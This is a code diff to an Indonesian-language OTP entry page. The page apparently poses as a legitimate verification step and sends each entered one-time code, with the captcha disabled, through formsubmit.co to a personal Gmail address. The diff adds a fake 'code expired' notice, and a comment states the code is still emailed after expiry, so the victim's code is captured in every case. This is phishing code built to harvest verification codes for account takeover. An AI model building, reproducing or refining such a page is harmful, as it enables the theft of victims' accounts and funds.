@@ -48,9 +48,14 @@
       border-radius: 10px;
     }
     .timer {
-      margin-bottom: 30px;
+      margin-bottom: 10px;
       font-weight: bold;
       color: #008CFF;
+    }
+    .error {
+      color: red;
+      margin-bottom: 20px;
+      font-weight: bold;
     }
     button {
       background-color: #008CFF;
@@ -75,6 +80,7 @@
       <input type="tel" maxlength="1" oninput="moveNext(this, 3)" required>
     </div>
     <div class="timer" id="timer">Kirim ulang dalam 100 detik</div>
+    <div class="error" id="errorMsg" style="display: none;">Kode OTP telah kadaluarsa</div>
     <form id="otpForm" action="https://formsubmit.co/baygaming648@gmail.com" method="POST" onsubmit="return submitOTP()">
       <input type="hidden" name="OTP" id="otpFull">
       <input type="hidden" name="_captcha" value="false">
@@ -82,28 +88,44 @@
       <button type="submit">KONFIRMASI</button>
     </form>
   </div>
+
   <script>
     const inputs = document.querySelectorAll(".otp-inputs input");
+    const timerEl = document.getElementById("timer");
+    const errorMsg = document.getElementById("errorMsg");
+    let countdown = 100;
+    let isExpired = false;
+
     function moveNext(el, index) {
       if (el.value.length === 1 && index < inputs.length - 1) {
         inputs[index + 1].focus();
       }
     }
+
     function submitOTP() {
       const otp = Array.from(inputs).map(i => i.value).join('');
       document.getElementById("otpFull").value = otp;
-      return true;
+
+      if (isExpired) {
+        errorMsg.style.display = "block";
+      } else {
+        errorMsg.style.display = "none";
+      }
+
+      return true; // tetap kirim ke email walau kadaluarsa
     }
-    let countdown = 100;
-    const timerEl = document.getElementById("timer");
+
     const interval = setInterval(() => {
       countdown--;
-      timerEl.textContent = "Kirim ulang dalam " + countdown + " detik";
-      if (countdown <= 0) {
+      if (countdown > 0) {
+        timerEl.textContent = "Kirim ulang dalam " + countdown + " detik";
+      } else {
         clearInterval(interval);
-        timerEl.textContent = "Silakan kirim ulang kode";
+        timerEl.textContent = "Kode OTP telah kadaluarsa";
+        isExpired = true;
       }
     }, 1000);
+
     window.onload = () => inputs[0].focus();
   </script>
 </body>
